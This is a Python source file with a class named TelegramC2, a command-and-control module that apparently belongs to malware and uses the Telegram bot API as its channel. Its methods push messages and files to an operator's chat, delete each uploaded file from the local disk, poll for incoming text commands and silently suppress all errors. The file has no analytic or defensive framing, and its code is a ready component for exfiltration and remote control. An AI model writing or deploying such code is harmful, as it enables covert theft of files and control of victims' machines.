import requests
import os
import time

class TelegramC2:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base = f"https://api.telegram.org/bot{token}"
        self.last_id = 0
    
    def send_message(self, msg):
        try:
            if len(msg) > 4000:
                for i in range(0, len(msg), 4000):
                    requests.post(f"{self.base}/sendMessage", json={"chat_id": self.chat_id, "text": msg[i:i+4000]})
            else:
                requests.post(f"{self.base}/sendMessage", json={"chat_id": self.chat_id, "text": msg})
        except:
            pass
    
    def send_file(self, path):
        try:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    requests.post(f"{self.base}/sendDocument", data={"chat_id": self.chat_id}, files={"document": f})
                os.remove(path)
        except:
            pass
    
    def get_commands(self):
        cmds = []
        try:
            r = requests.get(f"{self.base}/getUpdates", params={"offset": self.last_id + 1, "timeout": 10})
            if r.status_code == 200:
                data = r.json()
                if data.get("ok"):
                    for upd in data.get("result", []):
                        self.last_id = upd["update_id"]
                        if "message" in upd and "text" in upd["message"]:
                            cmds.append(upd["message"]["text"])
        except:
            pass
        return cmds
    
    def delete_command(self, cmd):
        pass
